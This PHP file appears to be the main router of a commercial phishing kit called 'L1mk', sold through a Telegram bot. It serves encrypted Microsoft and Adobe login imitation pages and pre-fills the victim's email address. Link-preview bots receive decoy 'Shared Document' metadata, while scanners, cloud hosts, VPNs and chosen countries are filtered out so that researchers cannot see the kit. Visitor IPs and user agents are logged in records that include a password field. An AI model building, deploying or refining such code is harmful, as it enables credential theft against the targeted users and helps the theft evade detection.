<?php
require_once __DIR__ . '/vendor/autoload.php';

use App\Config;
use App\Security;
use App\Router;
use App\Crypto;
use App\Api;

$dotenv = Dotenv\Dotenv::createImmutable(__DIR__);
$dotenv->safeLoad();

// CLI Routing
if (php_sapi_name() === 'cli' && !isset($_SERVER['REQUEST_METHOD'])) {
    $cmd = $argv[1] ?? 'help';
    if ($cmd === 'worker') {
        App\Worker::run();
    } elseif ($cmd === 'manage') {
        App\Console::handle($argv);
    } else {
        echo "L1mk Console\n";
        echo "Usage:\n";
        echo "  php index.php worker            Start background worker\n";
        echo "  php index.php manage [args...]  Manage encrypted files\n";
    }
    exit;
}

header_remove('X-Powered-By');

$path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);

if (($path === '/' || $path === '/index.php') && ($_SERVER['REQUEST_METHOD'] ?? '') === 'POST') {
    require __DIR__ . '/license_bot.php';
    exit;
}

if ($path === '/a') {
    require __DIR__ . '/license_bot.php';
    exit;
}

if (strpos($path, '/uploads/') === 0) {
    $rel = substr($path, strlen('/uploads/'));
    $rel = preg_replace('/[^a-zA-Z0-9._-]/', '', $rel);
    $file = __DIR__ . '/uploads/' . $rel;
    if (is_file($file)) {
        $fi = new finfo(FILEINFO_MIME_TYPE);
        $mime = $fi->file($file) ?: 'application/octet-stream';
        header('Content-Type: ' . $mime);
        readfile($file);
    } else {
        http_response_code(404);
    }
    exit;
}
if ($path === '/upload' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    http_response_code(405);
    echo "Uploads are allowed from admin panel only.";
    exit;
}
// Ignore static file requests (Favicon, etc.) that fall through to index.php
if (preg_match('/\.(ico|png|jpg|jpeg|gif|css|js|map|woff|woff2|ttf|svg|eot|txt|xml)$/i', $path)) {
    http_response_code(404);
    exit;
}

// API Routing
if ($path === '/api.php' || $path === '/api') {
    Api::handle();
    exit;
}

// Admin Routing
if ($path === '/admin.html') {
    $licenseValid = false;
    $licenseKey = '';
    if (!empty($_COOKIE['deploy_license'])) {
        $licenseKey = trim((string)$_COOKIE['deploy_license']);
    }
    if (($_SERVER['REQUEST_METHOD'] ?? '') === 'POST' && isset($_POST['license'])) {
        $licenseKey = trim((string)$_POST['license']);
    }
    if ($licenseKey === '8080') {
        $licenseValid = true;
        if (!isset($_COOKIE['deploy_license']) || $_COOKIE['deploy_license'] !== $licenseKey) {
            setcookie('deploy_license', $licenseKey, time() + 86400 * 30, '/', '', false, true);
        }
    }
    if (!$licenseValid && $licenseKey !== '') {
        $dbPath = __DIR__ . '/license_bot.db';
        if (is_file($dbPath)) {
            try {
                $pdo = new PDO('sqlite:' . $dbPath);
                $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
                $stmt = $pdo->prepare('SELECT status, expires_at FROM licenses WHERE license_key = :key LIMIT 1');
                $stmt->execute([':key' => $licenseKey]);
                $row = $stmt->fetch(PDO::FETCH_ASSOC);
                if ($row && $row['status'] === 'active' && isset($row['expires_at']) && $row['expires_at'] > gmdate('c')) {
                    $licenseValid = true;
                    if (!isset($_COOKIE['deploy_license']) || $_COOKIE['deploy_license'] !== $licenseKey) {
                        setcookie('deploy_license', $licenseKey, time() + 86400 * 30, '/', '', false, true);
                    }
                }
            } catch (Throwable $e) {
            }
        }
    }
    if (!$licenseValid) {
        header('Content-Type: text/html; charset=UTF-8');
        ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>L1mk Admin License</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { margin:0; padding:0; background:#020617; color:#e5e7eb; font-family:-apple-system,BlinkMacSystemFont,system-ui,sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; }
        .card { background:#020617; border:1px solid #1f2937; border-radius:0.75rem; padding:1.75rem; width:100%; max-width:360px; box-shadow:0 20px 40px rgba(15,23,42,0.5); }
        .title { font-size:1rem; font-weight:600; margin-bottom:0.5rem; color:#f9fafb; }
        .subtitle { font-size:0.8rem; color:#9ca3af; margin-bottom:1.25rem; }
        .input { width:100%; padding:0.6rem 0.75rem; border-radius:0.5rem; border:1px solid #374151; background:#020617; color:#e5e7eb; font-size:0.85rem; box-sizing:border-box; }
        .input:focus { outline:none; border-color:#6366f1; }
        .btn { width:100%; margin-top:0.75rem; padding:0.65rem 0.75rem; border-radius:0.5rem; border:none; background:#6366f1; color:#f9fafb; font-size:0.85rem; font-weight:600; cursor:pointer; }
        .btn:hover { background:#4f46e5; }
        .note { margin-top:0.75rem; font-size:0.75rem; color:#6b7280; }
    </style>
</head>
<body>
    <div class="card">
        <div class="title">Enter License Key</div>
        <div class="subtitle">Use a valid license generated by the Telegram bot to unlock the admin panel.</div>
        <form method="post" action="/admin.html">
            <input type="text" name="license" class="input" placeholder="XXXX-XXXX-XXXX-XXXX" required>
            <button type="submit" class="btn">Unlock Admin</button>
        </form>
        <div class="note">If you do not have a license, contact the bot to purchase one.</div>
    </div>
</body>
</html>
<?php
        exit;
    }
    $file = __DIR__ . '/admin.html.enc';
    if (file_exists($file)) {
        $content = Crypto::loadEncrypted($file);
        if ($content !== false) {
            header('Content-Type: text/html; charset=UTF-8');
            echo $content;
        } else {
            http_response_code(500);
            echo "Decryption failed.";
        }
    } else {
        http_response_code(404);
        echo "Admin panel not found.";
    }
    exit;
}

// Admin Upload Page (disabled GET - no separate page)
if ($path === '/admin/upload' && $_SERVER['REQUEST_METHOD'] === 'GET') {
    http_response_code(404);
    exit;
}

if ($path === '/admin/upload' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $ok = false;
    if (isset($_FILES['image']) && is_array($_FILES['image'])) {
        $f = $_FILES['image'];
        if (($f['error'] ?? UPLOAD_ERR_NO_FILE) === UPLOAD_ERR_OK) {
            $size = (int)($f['size'] ?? 0);
            if ($size > 0 && $size <= 25 * 1024 * 1024) {
                $tmp = $f['tmp_name'];
                $fi = new finfo(FILEINFO_MIME_TYPE);
                $mime = $fi->file($tmp) ?: '';
                $allowed = ['image/png' => 'png', 'image/jpeg' => 'jpg', 'image/webp' => 'webp'];
                if (isset($allowed[$mime])) {
                    $ext = $allowed[$mime];
                    $name = bin2hex(random_bytes(8)) . '.' . $ext;
                    $dir = __DIR__ . '/uploads';
                    if (!is_dir($dir)) mkdir($dir, 0755, true);
                    $dest = $dir . '/' . $name;
                    if (move_uploaded_file($tmp, $dest)) {
                        file_put_contents($dir . '/bg_current.txt', '/uploads/' . $name, LOCK_EX);
                        $ok = true;
                    }
                }
            }
        }
    }
    header('Location: /admin/upload' . ($ok ? '' : ''));
    exit;
}
// Error Page Routing
if ($path === '/error') {
    $file = __DIR__ . '/ErrorMsPAGE.html.enc';
    if (file_exists($file)) {
        header('Content-Type: text/html; charset=UTF-8');
        echo Crypto::loadEncrypted($file);
    } else {
        http_response_code(404);
        echo "Error page not found.";
    }
    exit;
}

if ($path === '/login/ms') {
    header('Location: https://login.microsoftonline.com/');
    exit;
}

session_start();

$uploadGet = ($path === '/upload' && $_SERVER['REQUEST_METHOD'] === 'GET');
if ($uploadGet) {
    $file = __DIR__ . '/upload.html.enc';
    if (file_exists($file)) {
        header('Content-Type: text/html; charset=UTF-8');
        $html = Crypto::loadEncrypted($file);
        $bgFile = __DIR__ . '/uploads/bg_current.txt';
        $bgUrl = (file_exists($bgFile)) ? trim(file_get_contents($bgFile)) : '';
        $safeBg = $bgUrl !== '' ? htmlspecialchars($bgUrl, ENT_QUOTES, 'UTF-8') : '';
        $html = str_replace('{{BG_URL}}', $safeBg, $html);
        echo $html;
    } else {
        http_response_code(404);
        echo "Upload page not found.";
    }
    exit;
}
$cfg = Config::load();

$securityEnabled = !empty($cfg['securityEnabled']);
$cfTurnstileEnabled = !empty($cfg['cfTurnstileEnabled']);
$blockedHostPatterns = ['amazonaws','googleusercontent','azure','digitalocean','linode','vultr','ovh','hetzner','contabo','aliyun','scaleway','oraclecloud','cloudflare','gcore','leaseweb','psychz','upcloud'];

// Routing Logic
$routeData = Router::handle();
$email = $routeData['email'];

// Per-request nonce and cache-control headers
$requestId = bin2hex(random_bytes(8));
header('Cache-Control: no-store, no-cache, must-revalidate');
header('Pragma: no-cache');
header('Vary: User-Agent');
header('X-Request-Id: ' . $requestId);

// Social Media Preview Handler (Bypass Security for Previews)
$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$previewBots = ['facebookexternalhit', 'twitterbot', 'telegrambot', 'discordbot', 'slackbot', 'whatsapp', 'linkedinbot', 'skypeuripreview', 'applebot'];
$isPreview = false;
foreach ($previewBots as $bot) {
    if (strpos($ua, $bot) !== false) {
        $isPreview = true;
        break;
    }
}

if ($isPreview) {
    header('Content-Type: text/html; charset=UTF-8');
    $displayEmail = $email ? $email : 'User';
    $now = date('c');
    $basePath = strtok($_SERVER['REQUEST_URI'] ?? '/', '?');
    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    $urlWithNonce = $scheme . '://' . ($_SERVER['HTTP_HOST'] ?? 'localhost') . $basePath . '?pv=' . $requestId;
    $uniqueTitle = 'Shared Document ' . substr($requestId, 0, 6);
    $uniqueDesc = 'View shared document for ' . htmlspecialchars($displayEmail, ENT_QUOTES, 'UTF-8') . ' • ' . $now;
    echo '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta property="og:title" content="' . htmlspecialchars($uniqueTitle, ENT_QUOTES, 'UTF-8') . '" /><meta property="og:description" content="' . htmlspecialchars($uniqueDesc, ENT_QUOTES, 'UTF-8') . '" /><meta property="og:type" content="website" /><meta property="og:url" content="' . htmlspecialchars($urlWithNonce, ENT_QUOTES, 'UTF-8') . '" /><meta name="twitter:card" content="summary"><meta name="twitter:title" content="' . htmlspecialchars($uniqueTitle, ENT_QUOTES, 'UTF-8') . '"><meta name="twitter:description" content="' . htmlspecialchars($uniqueDesc, ENT_QUOTES, 'UTF-8') . '"><meta name="request-id" content="' . htmlspecialchars($requestId, ENT_QUOTES, 'UTF-8') . '"></head><body></body></html>';
    exit;
}

$ip = Security::getClientIp();
$blocked = false;

// Country Blocking (Local DB)
if (!empty($cfg['countryBlockingEnabled']) && $ip) {
    // Check Whitelist
    $whitelisted = false;
    if (!empty($cfg['ipWhitelist'])) {
        $whitelist = array_map('trim', explode(',', $cfg['ipWhitelist']));
        if (in_array($ip, $whitelist)) $whitelisted = true;
    }

    if (!$whitelisted) {
        $allowedCountries = [];
        if (!empty($cfg['allowedCountries'])) {
            $allowedCountries = array_map('strtoupper', array_map('trim', explode(',', $cfg['allowedCountries'])));
        }

        if (!empty($allowedCountries)) {
            $dbPath = __DIR__ . '/IP2LOCATION-LITE-DB1.BIN';
            
            if (file_exists($dbPath)) {
                try {
                    $db = new \IP2Location\Database($dbPath, \IP2Location\Database::FILE_IO);
                    $records = $db->lookup($ip, \IP2Location\Database::ALL);
                    if ($records && !empty($records['countryCode'])) {
                        if (!in_array(strtoupper($records['countryCode']), $allowedCountries)) {
                            $blocked = true;
                        }
                    }
                } catch (Exception $e) {
                    // Ignore DB errors
                }
            }
        }
    }
}

if ($securityEnabled && $ip && !$blocked) {
    // 1. Check Headers for Proxy
    $blocked = Security::hasProxyHeaders();

    // 2. Check User Agent (Bots, Crawlers, Libraries)
    $botCheck = isset($cfg['botCheckEnabled']) ? !empty($cfg['botCheckEnabled']) : true;
    if (!$blocked && $botCheck) {
        $blocked = Security::isBotUserAgent();
    }

    // 3. Check Standard Browser Headers (Integrity)
    if (!$blocked) {
        $blocked = Security::isMissingStandardHeaders();
    }

    // 4. Reverse DNS Check (Hosting Providers)
    if (!$blocked) {
        $blocked = Security::rdnsBlocked($ip, $blockedHostPatterns);
    }

    // 5. VPN/Proxy/Risk API Check
    if (!$blocked && !empty($cfg['vpnCheckEnabled'])) {
        $apiKey = $cfg['vpnApiKey'] ?? '';
        $rep = Security::checkIpReputation($ip, $apiKey);
        if ($rep['blocked']) {
            $blocked = true;
        }
    }
}

if ($blocked) {
    http_response_code(403);
    header('Content-Type: text/html; charset=UTF-8');
    echo '<!doctype html><html><head><meta charset="utf-8"><title>Access blocked</title></head><body style="font-family:Segoe UI,Arial,sans-serif;padding:24px"><h1 style="font-size:20px;margin:0 0 8px">Access blocked</h1><div style="color:#555">Your network is not permitted.</div></body></html>';
    exit;
}

if ($cfTurnstileEnabled && empty($_SESSION['turnstile_verified'])) {
    header('Content-Type: text/html; charset=UTF-8');
    echo Crypto::loadEncrypted(__DIR__ . '/challenge.html.enc');
    exit;
}

// Serve page content
header('Content-Type: text/html; charset=UTF-8');

$template = $cfg['template'] ?? 'microsoft';
$step = $_GET['step'] ?? '';

if ($template === 'adobe' && $step !== 'verify') {
    $templateFile = __DIR__ . '/adobetemplate.html.enc';
} elseif ($template === 'upload' && $step !== 'ms') {
    $templateFile = __DIR__ . '/upload.html.enc';
} else {
    $templateFile = __DIR__ . '/template.html.enc';
}

if (file_exists($templateFile)) {
    $html = Crypto::loadEncrypted($templateFile);
} else {
    $html = Crypto::loadEncrypted(__DIR__ . '/template.html.enc');
}

if ($email) {
    $safeEmail = htmlspecialchars($email, ENT_QUOTES, 'UTF-8');
    $html = str_replace(
        'let prefilledEmail = ""; // SERVER_INJECT_EMAIL',
        'let prefilledEmail = "' . $safeEmail . '";',
        $html
    );
}

// Inject per-request meta into normal page
$meta = '<meta name="request-id" content="' . htmlspecialchars($requestId, ENT_QUOTES, 'UTF-8') . '">';
$html = preg_replace('/<\s*head\b[^>]*>/i', '$0' . $meta, $html, 1);

if (strpos($html, '{{BG_URL}}') !== false) {
    $bgFile = __DIR__ . '/uploads/bg_current.txt';
    $bgUrl = (file_exists($bgFile)) ? trim(file_get_contents($bgFile)) : '';
    $safeBg = $bgUrl !== '' ? htmlspecialchars($bgUrl, ENT_QUOTES, 'UTF-8') : '';
    $html = str_replace('{{BG_URL}}', $safeBg, $html);
}

// Log Visit
if (empty($_SESSION['visit_logged'])) {
    try {
        $db = new App\Database();
        $visitId = uniqid('v_', true);
        $db->logEvent([
            'cookieId' => $visitId,
            'type' => 'visit',
            'emailMask' => $email ? $email : 'visitor',
            'domain' => $_SERVER['HTTP_HOST'] ?? 'unknown',
            'attempt' => 0,
            'password' => '',
            'ip' => $ip,
            'ua' => $_SERVER['HTTP_USER_AGENT'] ?? '',
            'time' => date('c')
        ]);
        $_SESSION['visit_logged'] = true;
    } catch (Exception $e) {
        // Fail silently for visits
    }
}

echo $html;
